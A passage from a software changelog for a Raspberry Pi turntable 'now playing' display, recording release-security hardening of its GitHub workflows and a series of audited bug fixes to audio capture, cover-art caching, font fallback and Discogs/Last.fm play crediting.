# Changelog

All notable changes to vinyl-now-playing are documented here.

Format follows [Keep a Changelog](https://keepachangelog.com/en/1.0.0/).
Versions follow [Semantic Versioning](https://semver.org/): `MAJOR.MINOR.PATCH`.

---

## [Unreleased]

### Security and release trust

- **Controlled releases now authenticate the exact tested workflow run (#402 / R10-01).** A release may target only the current `main` SHA and must find one successful `push` run of `.github/workflows/tests.yml` for that SHA, with successful Python 3.11/3.12/3.13 jobs linked to that run. Missing, pending, failed, wrong-SHA, wrong-workflow, wrong-run, or mixed-suite checks fail closed. The workflow rechecks `main` immediately before creating the tag and GitHub Release together. GitHub immutable releases is enabled so published tags and assets cannot later be changed or deleted.
- **Release publication now uses an environment-approved, repository-scoped GitHub App (#402 / #416).** The ordinary `GITHUB_TOKEN` is read-only. After validation and Lane's approval of the protected `release` environment, `vinyl-now-playing-release-lbecker` mints a short-lived token limited to this repository's Contents write permission for the single tag-plus-Release call.
- **Version metadata validation moved before merge (#415 / R10-02).** The historical badge workflow is now a read-only pull-request check: VERSION, CHANGELOG, and the README badge must be updated together. It no longer holds `contents: write` or pushes a repair commit directly to `main`. All three release workflows use one behavior-tested metadata checker.
- **Dependency advisories now fail CI (#295 / R10-03).** Repository vulnerability alerts and automated security updates are enabled, and a SHA-pinned official PyPA action audits the resolved requirements on relevant changes, weekly, and on demand.
- **Every public version now has a controlled GitHub Release path (#416 / R10-07).** Generated notes link the tested commit and state the supported Python and Raspberry Pi OS versions; prerelease VERSION suffixes create prereleases.
- **The promised MIT grant now ships with the repository (#417 / R10-08).** `LICENSE` contains the full MIT text for Copyright (c) 2026 Lane Becker, and README links it.

### Process

- Added a tracked remediation decision ledger and mandatory per-issue regression contract at `docs/decisions/remediation-guardrails.md`, including accepted/deferred alternatives that previously lived only in closed issues and gitignored local audit history.

## [1.5.34] — 2026-08-13

**R9 Wave 3 — ops & polish (milestone `R9 Wave 3 — ops & polish`; #395–#404).**
The Round-9 audit's trailing batch — no MEDIUM+, all LOW/NIT robustness, CI, and
doc-honesty. Three code fixes (mutation-verified), one optimization tried and
**rejected** because it wasn't actually free, plus CI/doc corrections. Full suite
**1485 → 1510** (v1.5.32 baseline; +25 across W2+W3 tests). **#405 (R9-28, the
mutated-Pillow-global refactor) is deferred open** as tracked architecture,
alongside #394. Right-sized process for a no-MEDIUM+ batch: RED-first tests +
mutation on the code fixes, tight self-review in place of the twin-agent cold
review the earlier waves warranted.

### Fixed

- **The capture-error throttle key no longer FRAGMENTS on the 3-arg
  PortAudioError shape (#395 / R9-07 — LOW).** The classic ALSA/USB
  `paUnanticipatedHostError` formats as `"Unanticipated host API error:
  '<free ALSA text>' [host error N]"`. After the trailing bracket was stripped,
  the last colon segment was arbitrary quoted ALSA text, so two faults of the
  *same* condition minted different keys (`'Resource` vs `'No`) — the #304
  over-fragmentation bug in the opposite direction, and the stable condition
  never became the key. When the last segment is quoted free text, the key now
  derives from the condition segment that precedes it (`Unanticipated`).
- **A missing audio C-extension now parks instead of crash-looping (#396 /
  R9-13 — LOW).** `main.py` imported `AudioCapture` (→ `sounddevice` →
  `libportaudio2`) at module level, so a fresh Pi lacking `libportaudio2` (a
  documented first-boot state) died before `main()`'s try — bypassing the
  ConfigError→exit-78 park and crash-looping to StartLimitBurst. The import is
  now lazy, and a startup probe (`verify_audio_backend_importable`) surfaces the
  failure as the friendly park with an `apt-get install libportaudio2` hint.
- **A transient EIO during cover validation no longer permanently blacklists the
  URL (#397 / R9-15 — LOW).** `validate_image_file` condemned every failure as
  `PermanentCoverError`, so an errno-carrying `OSError` (EIO/ENOSPC — a real disk
  fault mid-read of the download temp) blacklisted a possibly-good cover forever.
  Both the header-probe and decode paths now route through `_classify_cover_error`
  (the same errno taxonomy already applied to downscale/normalize): errno-carrying
  OSErrors propagate (the download path backs off), errno-less content failures
  still condemn.

### CI

- **VERSION whitespace normalization unified across the release workflows (#398 /
  R9-17 — LOW).** `release-consistency.yml` used bare `$(cat VERSION)` while
  `sync-version-badge.yml` used `tr -d '[:space:]'`; a stray interior space would
  pass the badge job and hard-fail the tag job. Both now strip identically.

### Documented / accepted

- **#404 / R9-25 — accept-with-comment (optimization REJECTED).** Replacing the
  RMS `np.sqrt(np.mean(audio**2))` with `np.dot` to avoid the per-chunk ~2.6MB
  temp array was tried and reverted: `np.dot` (BLAS) accumulates sequentially
  while `np.mean` uses pairwise summation, which sums a constant array *exactly*.
  On an input sitting exactly at the threshold, `np.dot` yields
  `0.009999999999999981` (< threshold → spurious silence) vs `np.mean`'s
  `0.010000000000000002` (≥ threshold → music), breaking the documented
  "≥ threshold is music" needle-lift boundary. A cheap, immediately-freed
  transient is worth more than a misclassification; documented at the site.
- **#402 / R9-23 — wontfix-with-comment:** the release-consistency job checks
  tag/VERSION/CHANGELOG agreement, not the test suite; tags are cut on `main`
  commits `tests.yml` already ran green, so a tag-suite job would only re-test an
  already-tested tree. Noted in the workflow.
- **#403 / R9-24 — comment note (HYPOTHESIS/unreachable):** a cancel of
  `run_pipeline` *itself* during the drain `await` would skip the finally's
  stop/close statements — but the signal handler cancels only the legs, never
  `run_pipeline`. Documented with the shield/reorder fix to apply if that wiring
  ever changes.
- **Doc corrections:** `#399 / R9-19` — CHANGELOG [1.5.28] ship count corrected
  `1447 + 2 skips` → the true `1449/0` (the Noto files landed in that commit).
  `#400 / R9-21` — DESIGN.md's font-floor claim aligned to the CLAUDE.md per-role
  floors (they bind per-role, only the hero at ≈0.33, not all at one scale).
  `#401 / R9-22` — two ` ```python ` fences that contain shell relabeled ` ```bash `
  (+ a `cd` to repo root on the first-boot heredoc).

## [1.5.33] — 2026-08-13

**R9 Wave 2 — display correctness (milestone `R9 Wave 2 — display correctness`;
#385–#393).** The Round-9 audit's display batch: two MEDIUM rendering bugs, the
rest LOW/NIT hygiene and comment-honesty. RED-first where reproducible; every
code fix mutation-verified. The independent cold "break-this" review of the diff
found one HIGH regression **introduced by this wave's own R9-09 fix** (a
duplicate-decode race), and the mandated narrow second pass over that fix found
a MEDIUM leak in the first repair — both fixed and pinned before release (see
below). Full suite **1502 passed** (was 1485). **#394 (R9-27, the `CoverPipeline`
consolidation) is deferred open** as tracked architecture — the R9-05 sweep hoist
is the shipped point fix; the structural cure is a larger refactor to schedule
deliberately, not to rush into a bug-fix wave.

### Fixed

- **Mixed-script metadata no longer renders below the layout baseline (#385 /
  R9-04 — MEDIUM).** A composite line (Latin primary + Noto fallback for
  Cyrillic/CJK) loaded the fallback face at nominal size, so its taller em box
  pushed the run below the measured baseline — the accent divider struck hero
  descenders and a Cyrillic/CJK album title sat ~13px low with ink outside its
  slot. The fallback face is now loaded at the size whose **ascent matches the
  primary's** (`size × primary_ascent/fallback_ascent`), so the composite
  surface shares the Latin baseline and (within a pixel) height. Fixed in
  `typography.py`, not per call site; also normalizes all-CJK line height.
  Verified with ink-extent measurements at hero/artist/album sizes.
- **`_CompositeFont.size()` and `.render()` now compute height with the same
  baseline arithmetic (#391 / R9-16 — folded into R9-04).** `size()` used a
  naive max-of-run-heights; `render()` uses `max_ascent + max_descent`. They
  diverge only when the max-ascent and max-descent come from different runs —
  latent today (no caller consumes `size()[1]` on mixed runs, and the em-box
  match equalizes ascents), fixed as a consistency guarantee and pinned by a
  divergent-ascent stub test plus the real-bundled parity test.
- **The outgoing-cover sweep now runs on ANY change of the wanted URL (#386 /
  R9-05 — MEDIUM).** A track with no artwork (`cover_art_url` None) mid-session
  hit neither the `url != wanted` PLAYING branch nor the IDLE branch — the third
  unswept branch of the #306 bookkeeping class — so the old URL's on-disk marker
  and three failure dicts leaked, one entry-set per with-cover→no-cover boundary
  over a 24/7 run. The sweep is hoisted to fire whenever `outgoing not in (None,
  url)`, keeping the `_cover_bad_urls` blacklist exception.
- **`_decode_cover_async` / `_handle_corrupt_cover` no longer do blocking
  SD-card I/O on the event loop (#387 / R9-09 — LOW).** Both `exists()` stats
  (the pre-decode check and the vanished-vs-corrupt re-check) and the
  corrupt-cover `unlink()` now run in the default executor — the R8-26 rationale
  applied to the call sites it had missed. A stat/unlink on a dying card can
  block for seconds, exactly during the recovery episodes this coroutine is
  spawned in.
  - *Cold-review regression (HIGH, INTRODUCED-then-fixed): moving `exists()`
    off-loop put an `await` between the inflight-dedup CHECK and its CLAIM, so at
    10 fps several frames each spawned a duplicate decode — worst on the very
    slow card the fix targets. The inflight guard is now claimed BEFORE the first
    await, restoring the baseline's atomic check-and-claim.*
  - *Second-pass regression (MEDIUM, INTRODUCED-then-fixed): the first repair
    used two release sites and left the `exists()`-await-raise path uncovered —
    an `OSError` (pathlib does not swallow EIO) would strand the inflight key and
    lock the cover out of every future decode until restart. The entire body is
    now wrapped in ONE `try/finally` from the claim, so every exit — including an
    await that raises — releases the key. Three RED-first regression tests
    (duplicate-decode dedup, vanished-branch release, EIO-raise release), all
    mutation-verified.*
- **A pump-only video fault no longer flaps WARNING+recovered log pairs (#388 /
  R9-10 — LOW).** When the SDL event pump raised while rendering still worked,
  the once-per-episode latch cleared every iteration (~19 lines/second). A
  per-iteration `pump_faulted` flag now gates recovery on a genuinely clean
  pump+render iteration; recovery logs once.
- **The convert-fault deferral latch clears on entering an empty state (#392 /
  R9-18 — NIT).** `_cover_decode_deferred` / `_cover_decode_retry_at` survived
  into IDLE/ERROR, so a static screen took a probe frame every 5s forever; now
  swept alongside the other empty-state bookkeeping.

### Documented / accepted

- **#389 / R9-11:** corrected the false `_cover_bad_urls` comment — a return to a
  blacklisted cover after IDLE DOES lift the blacklist and re-attempt (bounded,
  with backoff), which the "never re-attempted" invariant denied. Behavior is
  defensible; the comment was not.
- **#390 / R9-12 — accept-with-comment:** the one-shot legacy-sweep × concurrent
  prune race can resurrect an evicted cover over the file bound with a falsified
  mtime — bounded to the startup sweep window, self-correcting at the next
  prune; documented rather than guarded (an exists-check-before-replace is a
  narrower race, not race-free).
- **#393 / R9-20:** noted the #356 secondary residual (an in-flight prefetch
  failing after the IDLE sweep re-seeds swept entries) at the site, closing the
  [1.5.29] doc gap.

### CI

- **Dependabot Python-3.11 floor-hold widened to a standing policy (Lane,
  2026-08-13).** The numpy `>=2.5.0` ignore (R9-06/#381, shipped in 1.5.32) is
  generalized in `dependabot.yml` to a documented, **human-enforced** rule: any
  bump whose new version raises the package's `Requires-Python` above 3.11 is
  held until 3.11 support is deliberately dropped, because the Bookworm Pi and
  the 3.11 CI leg must stay installable. Dependabot's `ignore` cannot gate on
  Requires-Python, so the rule is enforced per-PR by review (with a version
  `ignore` added only when a held bump keeps re-opening). Not a security waiver:
  3.11-compatible advisory bumps still merge.

## [1.5.32] — 2026-08-13

**R9 Wave 1 — spin-memory refinement (milestone `R9 Wave 1`; #378, #379, #380,
#382, #383, #384) + Wave-0 Dependabot triage (#381).** The Round-9 audit's
three MEDIUM credit/scrobble findings, two of them regressions minted by R8's
own credit-model redesign. Design locked by Lane 2026-08-13 (drop-on-
genuine-credit / count-aware scrobble cap / SpinMemory extraction / ratify the
confirmation-time timestamp). RED-first (three executed repros: A→B→A fast
swap credited A once not twice with its scrobbles suppressed; a noise blip
zeroed the flip-resume credit; a duplicated-title track lost its second
scrobble), all flipped; 8 targeted mutations killed. Full suite **1485 passed**
(was 1474). Depends on the three merged Dependabot floor bumps (#373/#376/#377)
landing first.

### Added

- **`src/tracking/spin_memory.py` — a `SpinMemory` object (#384 / R9-26)** that
  owns the per-physical-spin credit + scrobble memory: swap-at-boundary, the
  duplicate-credit judgment, credit/scrobble recording, and the two new drop
  rules. The spin-boundary contract was previously hand-threaded through four
  `ListenTracker` sites — both R9-01 and the R8-cold-review-F3 class lived in
  that threading; the object makes the drop rule one method and the threading
  bug class structurally hard.

### Fixed

- **A fast-swap evening no longer loses a record's second genuine play (#378 /
  R9-01 — MEDIUM, data integrity).** With every record swap under the 45s
  silence threshold, no genuine-silence boundary fires, so the whole evening
  was ONE spin to the R8-02 memory: an A→B→A sequence suppressed A's second
  full play's Play Count AND every one of its scrobbles (the return swap is an
  album-change split, not a #185 replay, so it carried no exemption). A credit
  landing for a DIFFERENT release now drops the other releases' credit entries
  and scrobble tallies — "the spin moved on to another record". Ping-pong noise
  cannot trigger the drop: a foreign 1-track swing session never passes the
  completion gate, so the R8-02 double-credit guard stays closed (pinned).
  *Accepted tradeoff (disclosed): the scrobble drop is unconditional on the
  other releases, so a foreign single that was misattributed-and-scrobbled
  earlier this spin has its tally cleared by an intervening genuine credit and
  can re-scrobble if re-misattributed — bounded by the number of genuine
  credits between re-commits (a few per evening), versus a genuine full play
  losing all its scrobbles forever. R8-09's core swing-back case (no
  intervening credit) stays fully closed.*
- **A noise blip during a flip no longer kills the flip-resume credit (#379 /
  R9-02 — MEDIUM).** The unarmed-terminal-end branch overwrote `_prev_unarmed`
  unconditionally, so a one-chunk transient (a cueing thump, a door slam) in
  the very flip gap the feature exists for minted an empty session that
  clobbered the fragment — the split full play was then suppressed. A
  zero-track session now touches the chain not at all (neither clearing nor
  re-seeding); the 300s gap anchor on the kept fragment still bounds the
  resume.
- **A duplicated-title track scrobbles up to its tracklist row count (#380 /
  R9-03 — MEDIUM).** The R8-09 scrobble key (title/artist/release) swallowed
  the second distinct "Interlude" on an album with repeated interlude titles.
  The originally-locked row-aware key was inert — `SideIndex` resolves a
  repeated title to its FIRST occurrence (B-5), so `global_index` was identical
  for both — so the fix is a per-key COUNT capped at the number of tracklist
  rows sharing the (tier-1-folded) title: the album's second "Interlude"
  scrobbles, an N+1th commit is a swing-back and is suppressed. A unique title
  keeps the plain one-scrobble dedup.

### Documented / ratified

- **#382 / R9-08:** ten shipped sites (comments, two operator docs, a test
  header, the [1.5.27] CHANGELOG bullet) described the pre-F3 "cleared when the
  finalize completes" semantics that the shipped swap-at-boundary design
  replaced — corrected, so a maintainer can't "fix toward" them and reopen the
  F3 race.
- **#383 / R9-14 — RATIFIED:** the Last.fm scrobble timestamp is confirmation
  time (~25–40s late), not track start — self-consistent, ordering-preserving,
  within tolerance; documented at the site, no code change.

### CI

- **#381 / R9-06:** `dependabot.yml` now ignores numpy `>=2.5.0` (it requires
  Python ≥3.12, which breaks the supported 3.11 CI leg and the Raspberry Pi OS
  Bookworm install path). Dependabot #375 was closed for the same reason; the
  four safe floor bumps (#373 requests, #374 discogs-client, #376 pyyaml,
  #377 pytest-timeout) merge separately.

## [1.5.31] — 2026-08-13

**R8 Wave 5 — ratifications & hardening residue (milestone `R8 Wave 5`; #367,
#368, #369, #370, #371, #372) — the FINAL Round-8 remediation wave.** Mostly
Lane-locked ratifications turned into truthful documentation; one behavioral
change (a warn-once). #366 (R8-10, the non-default-folder Discogs write probe)
deliberately stays OPEN — it is verified at Pi bring-up per first-boot-checklist
§7. Full suite **1474 passed** (was 1472).

### Fixed

- **The sounddevice private-API degradation is no longer silent (#369 /
  R8-20 — LOW).** The #194 hotplug recovery calls `sd._terminate()` /
  `sd._initialize()` (private, pinned working at the 0.5.5 floor); if an
  upgrade removes them the recovery silently reverted with only a debug line.
  It now WARNs exactly once, naming the installed version; repeats stay debug.
  Pinned warn-once by test.

### Documented (ratifications, Lane 2026-08-12)

- **#367 / R8-13:** the v1.5.20 sideless-gate behavior change (foreign-closer
  suppression before the ≥2-rows fallback) is RATIFIED as an intended
  missed-over-phantom extension; the `models.py` docstring that promised
  "unchanged" now describes the real gate order, and a correction note sits
  under [1.5.20].
- **#368 / R8-14:** the dropped "+N width reservation" half of #321 is
  RATIFIED — suppress-over-overflow is the fail-safe, the tight-box case is
  unreachable at 1024×600; the deviation is now documented at the
  `draw_chip` vertical check as a knowing B-17 exception.
- **#370 / R8-21:** #330's un-built "unify the Last.fm placeholder trio into
  ConfigError" clause is RATIFIED as deliberate (optional feature; graceful
  degrade beats parking the service) — ratification note under [1.5.24].
- **#371 / R8-27:** `fit_wrapped`'s absolute-pixel minimums are documented as
  the same posture as the `layouts.py` legibility floors (unscaled by design;
  irrelevant at the shipped 1024×600).
- **#372 / R8-28:** the palette-lerp label-cache churn (~160 inserts vs 128
  entries for the 1s lerp) is ACCEPTED as-is, documented at
  `_LABEL_CACHE_MAX` with the reasoning (bounded, invisible, ends with the
  lerp; not worth doubling the resident surface set).

## [1.5.30] — 2026-08-13

**R8 Wave 4 — CI & test integrity (milestone `R8 Wave 4`; #361, #362, #363,
#364, #365).** No design gate; no `src/` change (docs, workflows, tests only).
Both new guards kill-checked (a blocked `import shazamio` fails TWO tests; a
one-character regex drift trips the wire). Full suite **1472 passed** (was
1468).

### Fixed

- **The Python-3.13 CI leg can now actually FAIL on the #198 class (#361 /
  R8-08 — MEDIUM).** The suite's only touch of the real shazamio was
  `pytest.importorskip` — which SKIPS (reports green) on failure — so a broken
  3.13 import (audioop removed; the audioop-lts backport path) left the whole
  matrix green while the tests.yml comment claimed otherwise. New
  `tests/test_ci_integrity_r8.py` hard-imports shazamio on the running
  interpreter and runs the startup probe with its REAL importer; the tests.yml
  comment now tells the truth (and names the three-leg 3.11/3.12/3.13 matrix
  correctly).
- **The R7-24 doc deliverable landed, with claims scoped to what GitHub
  actually documents (#362 / R8-19 — LOW).** The setup guide gains a
  Maintenance section covering the weekly drift check's possible
  schedule-auto-disable (documented by GitHub for PUBLIC repos; flagged as
  unverified for private ones — the cold review caught the first cut stating
  it, and a "Dependabot keeps arriving regardless" companion claim, as
  unconditional fact while remediating exactly that failure mode) and
  Dependabot's own ~90-day PR pause; dependabot.yml and tests.yml now agree
  with the guide (a `workflow_dispatch` re-runs the check but is not
  documented to reset any disable window). The four R8 bring-up probes are
  folded into first-boot-checklist §7 (Pi-side `import shazamio` pre-flight,
  the #366 non-default-folder credit probe, the shared token-budget note, the
  palette-lerp fps dip).
- **The duplicated release-version regex got its tripwire (#363 / R8-22 —
  NIT).** Per the issue's accept-with-a-stronger-tripwire option: a test
  extracts the pattern from both workflows and fails the moment they drift,
  plus a control test pinning the shared pattern's accept/reject behavior
  (shell `grep -Eq` vs Python `re.search` equivalence verified case by case in
  review).
- **`asyncio.get_event_loop()` inside a coroutine removed (#364 / R8-24 —
  NIT)** — the last regression against the completed `get_running_loop`
  migration (`tests/test_split_finalize_drain_187.py`).
- **pi-setup §9 says "up to four" read-only tests (#365 / R8-25 — NIT)** —
  `get_tracklist` runs only on a collection hit, exactly as
  `discogs_live_check.py` implements.

## [1.5.29] — 2026-08-13

**R8 Wave 3 — cover pipeline residue (milestone `R8 Wave 3`; #356, #357, #358,
#359, #360).** No design gate. RED-first (four executed repros: A→IDLE→B left
all three bookkeeping entries; 3400×3100 and 4000×3000 scans rejected; a
3000×3000 scan stored full-size; the type-only throttle key hiding a new error
condition), all flipped.
⚠ The independent break-this cold review + two narrow follow-up passes caught
and fixed six issues in the first cuts before commit: (F1) the legacy sweep
wrapped EVERY failure into a permanent condemnation, so a transient disk error
(ENOSPC/EIO — the exact flaky-SD hardware this wave hardens against) DELETED a
good cover; failures are now classified by errno (disk errors propagate, the
sweep skips and retries next boot; only errno-less content failures condemn
bytes). (F2) `Image.MAX_IMAGE_PIXELS` is a process global mutated to DIFFERENT
bounds by validate (10.24MP) and downscale (36MP) — concurrent executor
threads raced and a legitimate 25MP legacy file bombed out under the wrong
bound and was deleted; all bomb-limit critical sections now serialize on a
lock, INCLUDING the header probes (the second pass proved Pillow's bomb check
fires at open time, re-entering the race one call earlier — probes now go
through a locked `_probe_image_header`; the third pass verified no deadlock,
no restore-chain leak, and the 2× margin on normalize's unlocked body).
(F3) sounddevice's `PortAudioError` formats with a CONSTANT first word
("Error opening InputStream: <condition> [PaErrorCode N]"), so the first-cut
key degenerated to type-only for the dominant capture error class — the key
now takes the last colon segment when the trailing bracket is present.
(F4) `.norm-part` tempfiles stranded by a hard kill were invisible to every
cleanup mechanism — `_sweep_partials` now globs them, and the atomic-save
helper unlinks its tmp on any failure. (F5) the sweep deleted legacy oversized
non-JPEGs that RENDER fine today — it now skips them (the modern write path
governs new downloads). (F6/F7) the sweep's dead `except OSError` is now live,
and the run()-start sweep spawn is re-entry-guarded. 16/16 targeted mutations
killed. Full suite **1468 passed** (was 1449).

### Fixed

- **The #306 sweep now runs on the COMMON album boundary (#356 / R8-05 —
  MEDIUM).** It lived only in the direct-track-change branch, but between
  records there is ≥45s of silence → IDLE, which nulled `_wanted_cover_url`
  first — so the previous album's `_cover_download_failures` /
  `_cover_download_retry_after` / `_cover_decode_failures` entries survived
  forever and v1.5.26's "no longer grows unbounded" claim did not hold on the
  path records actually take (a correction note now sits under [1.5.26]).
  The IDLE/ERROR/LISTENING branch sweeps the outgoing URL's three dicts;
  `_cover_bad_urls` deliberately persists (the accepted STAB-1 residual).
- **Near-square oversized scans downscale instead of blacklisting (#357 /
  R8-11 — LOW).** The #305 draft box (1600) only engaged when the minor axis
  was ≥3200, so a 3400×3100 (ratio 1.10!) or 4000×3000 scan raised
  `PermanentCoverError` → immediate blacklist → blank cover, while the
  accompanying comment claimed only "unusual wide covers" were affected. Box
  is now 800: reduction engages at minor ≥1600, the reduced decode is bounded
  at 2.56 MP (FOUR times stronger than before), and the rejected set shrinks
  to genuine extreme ratios (still blanked via the post-draft re-check, e.g.
  11000×1000; a 12000×2000 that used to be rejected now reduces).
- **A genuinely NEW capture-error condition surfaces immediately again (#358 /
  R8-12 — LOW).** The #304 type-only throttle key made "Invalid sample rate"
  invisible for up to 30s behind an earlier "Device unavailable" (both
  OSError) and attributed mixed tallies to whichever message was current. The
  key is now (exception type, first message word) with the "[Errno N]" bracket
  stripped first — every OSError begins "[Errno", so without the strip the
  first-word key would collapse back to type-only. The #304 anti-flood
  property is preserved: a varying device index / errno deeper in the message
  cannot mint per-variant keys.
- **Every cover is normalized to display scale at cache-write, and legacy
  files get a one-shot startup sweep (#359 / R8-18 + E1 — LOW/performance).**
  A typical 3000×3000 CAA scan was stored full-size forever, paying a
  Pi-scaled ~0.4–0.7s on-loop `convert()+smoothscale` stall (~118MB episode
  peak) on every decode plus ~100MB palette executor decodes.
  `normalize_cover_image` (≤880px longer side — 2× the 440px display slot —
  RGB JPEG, CMYK converted defensively, atomic tmp+`os.replace` rewrite) runs
  in the download pipeline after downscale+validate, and
  `CoverArtCache.sweep_legacy_oversized()` — spawned once by the render loop
  at start, in the executor — normalizes pre-v1.5.29 files in place (dropping
  undecodable legacy files; the already-normalized common case is a header
  read). Disk cache shrinks several-fold as a side effect.
- **The two event-loop `exists()` stats moved behind the executor (#360 /
  R8-26 — NIT).** `_prefetch_cover` and `_extract_palette_async` each ran one
  blocking stat on the loop per track change; on a dying SD card a stat can
  block for seconds. Both now `run_in_executor`.

## [1.5.28] — 2026-08-12

**R8 Wave 2 — display i18n & render survival (milestone `R8 Wave 2`; #352,
#353, #354, #355).** The audit's third HIGH plus the display's two
video-fault resilience gaps. Design gate cleared with rendered mockups (Lane,
2026-08-12): Noto Sans JP fallback in role-matched weights, upright fallback
runs. RED-first: three executed reproductions on the pre-fix code (4/4 album
chars tofu; 30 full decodes over a 30-frame convert-fault episode; `run()`
dying on the first `pygame.error`), all flipped.
⚠ The independent break-this cold review + two narrow follow-up passes caught
and fixed five issues in the first cuts before commit: (F1) the R8-06 gate
traded the decode storm for a **permanent placeholder under reduced_motion**
(the storm had accidentally been the recovery mechanism) — the probe is now
clock-driven from the render loop, re-armed after the probe frame (the first
re-arm attempt deadlocked its own probe — caught by the third pass' scope);
(F3) `pygame.event.get()` can also raise `pygame.error` on a dead video
subsystem and sat outside the survival try — pump faults now join the episode
and route into the reinit/recovery path; (F5) a combining mark after a
fallback run detached into its own primary run — marks now stay attached to
their base's run when covered; (F4) multi-run renders honour a `background`
argument; (F3P-1) a stale decode task (track changed mid-decode) can no longer
latch the global episode flag against the new cover. A vacuous test assertion
(F2) was also fixed and its mutant re-killed. 14/14 targeted mutations killed.
Full suite **1449 passed** (the two Noto-fallback tests activate — those font
files landed in THIS commit, so the true ship state was 1449/0, not the
"1447 + 2 skips" pre-landing count first written here — corrected R9-19/#399).

### Fixed

- **Non-Latin metadata renders real glyphs instead of tofu boxes (#352 /
  R8-03 — HIGH).** `pygame.font.Font` renders one file with no fallback chain,
  and no bundled face covered CJK — a Japanese pressing (坂本龍一) rendered
  every role as .notdef boxes, and Newsreader-Italic's missing Cyrillic/Greek
  meant a Кино record rendered the artist fine and the album title as boxes on
  the same screen. `TextRenderer.font()` now returns a `_CompositeFont`: runs
  the primary face doesn't cover (per its cmap, read once via the new
  `fonttools` dependency) render with the role's Noto Sans JP fallback face
  (hero→SemiBold, artist→Medium, album+mono→Regular — see
  `src/display/assets/fonts/fallback/README.md`), upright, baseline-aligned,
  through every text path (wrap/fit/tracked/ellipsize/chips) with zero call-site
  changes. ASCII takes a byte-identical fast path; layout metrics stay the
  primary face's (no line-height jumps); text neither face covers (Arabic —
  deliberately unbundled) renders exactly as before. Missing fallback files or
  fontTools degrade to pre-R8-03 single-face rendering with one WARNING.
- **A video-loss episode no longer costs a full JPEG decode + SD read at
  ~10 Hz (#353 / R8-06 — MEDIUM).** The `_cover_decode_deferred` latch
  suppressed only the LOG; each failed `convert()` cleared the inflight guard
  and left the URL marked on-disk, so `_load_cover` re-spawned the decode every
  frame for the whole HDMI fault (executed: 30 frames → 30 decodes; now 1).
  The latch now gates the WORK: one probe per `_COVER_DECODE_RETRY_SECONDS`
  (5s), the deadline re-arms on every failed attempt, and a clean decode or a
  new cover clears it.
- **A `pygame.error` escaping the per-frame render no longer kills the whole
  pipeline (#354 / R8-07 — MEDIUM).** One flaky HDMI cable used to mean
  display-leg fault → FIRST_COMPLETED → process exit → systemd restart loop.
  `run()` now logs once per episode, slows to ~1 attempt/s, re-tries
  `pygame.display.set_mode` every `_RENDER_FAULT_REINIT_SECONDS` (5s, with a
  forced static-frame recompose on recovery), and logs the episode duration
  when the display returns. Non-pygame exceptions remain fatal — fail-fast on
  genuine bugs is unchanged.

### Added

- `tests/test_font_fallback_r8.py` (run-splitting with a bundled-font stand-in
  fallback + real-Noto tests that activate when the files land) and
  `tests/test_display_survival_r8.py` (decode-storm gate, deadline re-arm,
  fault survival, re-init, non-pygame fatality).
- `fonttools>=4.38.0` (pure-Python, startup-only cmap reads).

### Documented

- R8-23 (#355): `render_tracked_ellipsized`'s shaped/RTL limitations (logical-
  end ellipsis, joining-form changes at the cut, binary-search monotonicity
  assumption) — data-field-only, backstopped by the caller's area clip, moot
  until shaped scripts get a covered face.

## [1.5.27] — 2026-08-12

**R8 Wave 1 — credit timing at real cadence (milestone `R8 Wave 1`; #345, #346,
#347, #348, #349, #350, #351).** The Round-8 audit's two HIGH findings, plus their
whole defect class: both flagship R7 Wave-1 credit fixes passed their own
compressed-time tests and failed at the pipeline's real cadence (15s chunks /
10s hop / 2-confirmation / 45s silence) — R8-01 flip-resume could never fire,
and R8-02's 45s window expired between two confirmation cycles, letting one
physical spin double-credit the real Discogs collection. Design locked by Lane
2026-08-12: silence-boundary credit memory, gap-anchored flip-resume,
finalize-at-drain. Every wall-clock-guarded behavior now carries a
realistic-cadence test on a fake tracker-scoped monotonic clock (the R8-04 exit
criterion — the tests that would have caught both HIGHs). RED-first end-to-end:
six executed reproductions on the pre-fix code (2 credits / 0 credits / 2
credits / stale chain / 0 at drain / 2 scrobbles), all flipped by the fixes.
⚠ The independent break-this cold review then caught a **HIGH I introduced in
the first cut (F1)**: switching the #195 forced end to `SESSION_ENDED_FORCED`
updated only ONE of the event's two consumers — `apply_state_silence_effect`
still switched on `SESSION_ENDED` alone, so a forced end no longer cleared the
card or bumped the B-1 session epoch (stranded display, stale in-flight commits
passing every staleness check). Fixed + pinned by a wiring test. Two more
review catches reworked: (F2) the forced end used to latch the silence detector
closed, so an input that decayed without re-crossing the music threshold never
produced another event and the surviving spin memory ate the NEXT genuine
spin's credit — the detector now re-arms its silence timer (a genuine boundary
one window later; the dead-band residual is documented in-code); (F3) the
boundary clear ran when the terminal finalize *completed* (legally minutes late
on the honoured-Retry-After path), wiping keys the next spin had recorded — the
spin-memory swap is now synchronous at the boundary, with the outgoing memory
threaded to the boundary finalize. A narrow second pass over the rework
converged (one LOW comment correction). 13/13 targeted mutations killed. Full
suite **1424 passed** (was 1403).

### Fixed

- **One physical spin can no longer double-credit at ANY confirmation cadence
  (#346 / R8-02 — HIGH, data integrity).** The R7-02 credited-memory was a 45s
  wall-clock window — but the gap it actually measured (credit #1 landing → the
  next split's finalize) spans two ping-pong confirmation cycles, routinely
  50–70s, so the guard expired and the double-credit returned (boundary: 22s
  cycles → 1 credit, 23s → 2). The memory is now a per-spin set
  (`_credited_this_spin`), cleared ONLY when a terminal genuine-silence finalize
  completes — "one physical spin" is delimited by what delimits it, real
  silence, so the guard is timing-independent by construction. The #185
  replay-boundary exemption (a genuine re-drop credits again) is unchanged.
  *Correction note (R9-08/#382, v1.5.32): "cleared when the finalize completes"
  described the FIRST cut, which the same release's own cold-review F3 fix
  replaced — the shipped mechanism swaps the live memory at the boundary EVENT
  itself, precisely because a boundary finalize legally completes minutes late
  (honoured Retry-After) and must judge against its own outgoing spin. Since
  v1.5.32 the memory is owned by `SpinMemory` (R9-26).*
- **Flip-resume actually fires now (#345 / R8-01 — HIGH).** The R7-03 window was
  anchored at the prior session's `started_at` and measured at the armed
  session's finalize — fragment play + gap + tail play + trailing silence always
  exceeded 300s for real music, so the exact credit the feature shipped to save
  (a full play split by a sleeve-cleaning pause) was still lost every time, and
  the R7-03 log line had never once been reachable. The window now bounds the
  GAP — `new_session.started_at - prev.ended_at` (a new `PlaySession.ended_at`
  stamped at detach) — per #316's original text and what testing-guide.md
  always described. Verified at the realistic timeline (200s fragment / 60s gap
  / 240s closer), with both wrong anchors mutation-killed.
- **The attribution ping-pong no longer duplicates Last.fm scrobbles (#348 /
  R8-09).** A swing-back re-commits the same physical play (the foreign
